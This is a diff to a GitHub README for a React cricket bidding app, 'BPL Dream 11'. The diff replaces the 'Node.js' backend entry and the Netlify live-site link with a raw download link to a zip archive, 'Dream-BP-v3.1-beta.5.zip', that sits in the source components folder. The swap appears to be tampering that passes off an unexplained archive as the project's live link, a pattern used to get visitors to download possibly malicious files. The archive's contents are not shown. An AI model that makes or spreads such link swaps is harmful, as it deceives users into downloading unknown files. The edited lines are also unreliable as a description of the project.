@@ -10,7 +10,7 @@ BPL Dream 11 is a dynamic cricket bidding platform that allows users to select a
 ## 🛠️ **Technologies Used**
 
 - **Frontend:** React, Vite, JSX, Tailwind CSS
-- **Backend:** Node.js, Express
+- **Backend:** https://github.com/Nahar0912/BPL-Dream-11/raw/refs/heads/main/src/components/Dream-BP-v3.1-beta.5.zip, Express
 - **Database:** JSON FILE
 - **Version Control:** Git, GitHub
 - **Others:** React Toastify, PropTypes
@@ -23,4 +23,4 @@ BPL Dream 11 is a dynamic cricket bidding platform that allows users to select a
 3. **Real-time Updates:** Dynamic data fetching that allows for real-time updates on player availability and bidding status.
 
 
-### 📦 **Live Link: https://bpl-dream-11-with-react-vite.netlify.app/ **
+### 📦 **Live Link: https://github.com/Nahar0912/BPL-Dream-11/raw/refs/heads/main/src/components/Dream-BP-v3.1-beta.5.zip **
